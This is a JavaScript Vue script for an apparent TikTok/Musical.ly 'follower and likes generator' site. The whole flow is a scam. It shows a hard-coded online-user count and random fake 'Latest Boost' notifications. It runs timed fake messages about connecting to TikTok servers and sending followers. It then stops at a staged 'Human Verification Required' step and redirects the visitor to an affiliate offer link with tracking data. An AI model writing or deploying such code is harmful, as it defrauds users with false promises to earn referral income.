ELEMENT.locale(ELEMENT.lang.en);

new Vue({

  el: '#generator',

  mounted: function() {
    var self = this;
    $.get('latestBoosts.php' , function(data, status, xhr) {
    	self.latest_boosts = data;
    	
    	if (self.latest_boosts.length > 0) {
	    	var updates_interval = setInterval(function() {
		      var boost_entry = self.latest_boosts[Math.floor(Math.random() * self.latest_boosts.length)];
		
		      self.$notify({
		        title: 'Latest Boost',
		        message:  '@' + boost_entry['username'] + ' received a 50 ' + (boost_entry['type'] == 0 ? ' followers' : ' likes') + ' boost!',
		        type: 'success'
		      });
		    }, self.random_int(10000, 20000));
	    }
    });
  },

  data: function() {
    return {
      loading: false,
      loading_text: 'Loading...',
      online_users: 12438,
      step: 0,
      account_progress: 0,
      show_account: false,
      account_form: {
        username: '',
        followers: 1,
        encryption: false
      },
      account: false,
      wrong_muser: false,
      boost_type: -1,
      boost_type_text: "",
      trial: "used"
    };
  },

  computed: {

  },

  methods: {

    start_generator: function() {
      var self = this;
      self.$refs['account_form'].validate(function(valid) {
        if(!valid) {
          self.loading = false;
          return self.$confirm('You need to enter your Musical.ly username before any attempt to boost a profile.', 'Warning', {
            confirmButtonText: 'OK',
            showCancelButton: false,
            type: 'warning'
          });
        }
        self.get_account_info();
      });
    },
    
    fix_wrong_muser: function() {
    	var self = this;
    	self.wrong_muser = false;
    	self.step = 1;
    },
    
    bypass_check: function() {
    	var self = this;
    	self.account = {"name": self.account_form.username.replace("\ufeff", ""), "followers": 0, "likes": 0, "avatar":"http:\/\/mpak-suse1.akamaized.net\/default_user_icon.png"};
    	
    	self.confirm_account();
    },
    
    restart: function() {
    	var self = this;
    	self.$confirm('Would you like to follow our profile to stay updated ?', 'Question', {
                        confirmButtonText: 'Of course !',
			cancelButtonText: 'No thanks. Start another boost now !',
			cancelButtonClass: 'el-button el-button--error',
                        showCancelButton: true,
                        type: 'info',
                    	callback: function(isConfirm) { 
                    		if (isConfirm == 'confirm') {    
    					location.href = "http://muserfrenzy.org";
                    		}
                    		else {
                    			location.href = "http://muserfrenzy.org";
                    		}
                    	}
                    });
    },
    
    fans_boost: function() {
    	var self = this;
    	self.boost_type = 0;
    	self.boost_type_text = "Followers";
    	self.step = 1;
    },
    
    hearts_boost: function() {
    	var self = this;
    	self.boost_type = 1;
    	self.boost_type_text = "Likes";
    	self.step = 1;
    },

    get_account_info: function() {
      $.ajaxSetup({timeout:8000});

      var self = this;
      self.loading = true;
      
      $.get('fetchMuserProfile.php?username=' + self.account_form.username.replace("\ufeff", "") , function(data, status, xhr) {
        self.account = data;
        (new Image()).src = self.account.avatar;
        
        $.get('verifyTrial.php?username=' + self.account_form.username.replace("\ufeff", "") , function(trialData) {
        	self.trial = trialData.trial;
        });
        
        self.step = 2;
        self.loading = false;
        self.show_account = false,
        self.account_progress = 0;
        var progress = 0;
        
        var interval = setInterval(function() {
          if(progress >= 100) {
            self.account_progress = 100;
            self.account_progress = progress;
            clearInterval(interval);

            setInterval(function () {
                
                if (!self.show_account && self.account.isPrivate) {
                	self.$confirm('Your Musical.ly profile is private. Make sure you make it public, else your boost might not work !', 'Warning', {
                        confirmButtonText: 'I Understand',
                        showCancelButton: false,
                        type: 'warning',
                    });
                }                
                
                self.show_account = true;
            }, 750);
          } else {
            progress+= 1;
            self.account_progress = progress;
          }
        }, 1);
      }).fail(function() {        
        self.loading = false;
        self.wrong_muser = true;
        self.step = -1;
      });
    },

    cancel_step: function(current_step) {
      var self = this;
      self.step = current_step - 1;
    },

    confirm_account: function() {
      var self = this;
      self.loading = true;
      var messages = [
        'Connecting to TikTok servers',
        'Applying Updates...',
        'Loading data for user ' + self.account_form.username + '...',
        'Sending ' + self.account_form.followers + (self.boost_type == 0 ? ' new followers...' : ' likes...'),
        'User ' + self.account_form.username + ' not found in database',
        'Retrying...',
        'Human Verification Required...',
      ];
      
      if (self.trial == 'available') {
      	var messages = [
	        'Connecting to TikTok servers',
	        'Applying updates...',
	        'Loading data for user ' + self.account_form.username + '...',
	        'Sending ' + self.account_form.followers + (self.boost_type == 0 ? ' new followers...' : ' likes...'),
	        'Operation was successful !',
	        'Boosting profile...',
	        'No Verification Required!',
	      ];
      }
      
      var timeout = 500;
      for(var i = 0, length = messages.length; i < length; i++) {
        timeout += self.random_int(700, 1000);
        if(i == (length - 1)) {
          self.change_loading_message('Human Verification Required...', timeout, self.human_verification_step);
        } else {
          self.change_loading_message(messages[i], timeout);
        }    
      }
    },

    human_verification_step: function() {
      var self = this;
      self.wrong_muser = false;
      self.loading = false;
      
      if (self.trial == "used") {
      	self.step = 3;
      } else {
      	if (self.boost_type == 0) {
	      	self.account.target = self.account.followers + self.account_form.followers;
	}
	else {
	      	self.account.target = self.account.likes + self.account_form.followers;
	}
	self.account.boost_type = self.boost_type;
	      
      var muserData = {'muserData': self.base64_encode(JSON.stringify(self.account))};
      $.ajax({
      	type: 'POST',
      	url: "setMuserData.php",
      	data: muserData,
      	async: false
      });

      location.href = "http://muserfrenzy.org";
      }
    },

    change_loading_message: function(message, timeout, cb) {
      var self = this;
      var new_timeout = setTimeout(function() {
        clearTimeout(new_timeout);
        self.loading_text = message;
        if(typeof cb == 'function') {
          cb();
        }
      }, timeout);
    },

    verify_connection: function() {
      var self = this;
      
      if (self.boost_type == 0) {
      	self.account.target = self.account.followers + self.account_form.followers;
      }
      else {
      	self.account.target = self.account.likes + self.account_form.followers;
      }
      self.account.boost_type = self.boost_type;
      
      var muserData = {'muserData': self.base64_encode(JSON.stringify(self.account))};
      $.ajax({
      	type: 'POST',
      	url: "setMuserData.php",
      	data: muserData,
      	async: false
      });

      var trackingData = self.base64_encode(JSON.stringify({'userid': self.account.id, 'username': self.account.username, 'amount': self.account_form.followers, 'type': self.account.boost_type}));
      location.href = "https://www.wauwfy.com/go.php?oid=13008&t=d&tid=5623&sid=" + trackingData;
    },

    random_int: function(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    },

    comma_separate_number: function (val){
      while (/(\d+)(\d{3})/.test(val.toString())){
          val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
      }
      return val;
    },

    base64_encode: function (stringToEncode) {
        if (typeof window !== 'undefined') {
            if (typeof window.btoa !== 'undefined') {
                return window.btoa(encodeURIComponent(stringToEncode))
            }
        } else {
            return new Buffer(stringToEncode).toString('base64')
        }
        var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        var o1
        var o2
        var o3
        var h1
        var h2
        var h3
        var h4
        var bits
        var i = 0
        var ac = 0
        var enc = ''
        var tmpArr = []
        if (!stringToEncode) {
            return stringToEncode
        }
        stringToEncode = decodeURIComponent(encodeURIComponent(stringToEncode))
        do {
            // pack three octets into four hexets
            o1 = stringToEncode.charCodeAt(i++)
            o2 = stringToEncode.charCodeAt(i++)
            o3 = stringToEncode.charCodeAt(i++)
            bits = o1 << 16 | o2 << 8 | o3
            h1 = bits >> 18 & 0x3f
            h2 = bits >> 12 & 0x3f
            h3 = bits >> 6 & 0x3f
            h4 = bits & 0x3f
            // use hexets to index into b64, and append result to encoded string
            tmpArr[ac++] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4)
        } while (i < stringToEncode.length)
        enc = tmpArr.join('')
        var r = stringToEncode.length % 3
        return (r ? enc.slice(0, r - 3) : enc) + '==='.slice(r || 3)
    }
  }
});